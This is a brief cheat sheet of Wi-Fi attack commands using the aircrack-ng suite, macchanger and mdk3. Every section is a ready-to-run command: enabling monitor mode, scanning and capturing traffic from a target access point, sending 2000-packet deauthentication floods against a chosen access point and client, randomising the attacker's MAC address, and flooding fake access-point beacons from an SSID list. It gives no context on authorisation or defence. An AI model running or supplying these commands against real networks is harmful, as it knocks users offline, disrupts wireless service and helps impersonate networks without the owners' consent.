
### Example of commands

### prep interface

```airmon-ng check kill```

```sudo airmon-ng start wlan1```

* now our monitor interface will be wlan1mon

----

### de-auth

scan for deauth prep, examples below

``` sudo airodump-ng wlan1mon --channel 6 ```

``` airodump-ng --channel 2 --bssid xx:xx:xx:xx:xx:xx wlan1mon ```

``` airodump-ng --channel 5 -w googleopendump --bssid xx:xx:xx:xx:xx:xx wlan1mon ```


----

### replay

Simple: ```aireplay-ng --deauth 2000```

More: ```aireplay-ng --deauth 2000 -a <bsid mac> -c <station client mac> ```

----

### MAC changer (if needed)

```
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```

----

### sporadic-clone-ap

```mdk3 wlan0 b -f ssid_list.txt  -g -a -c 6```

```-c``` being channel, can not specify for mixed results.




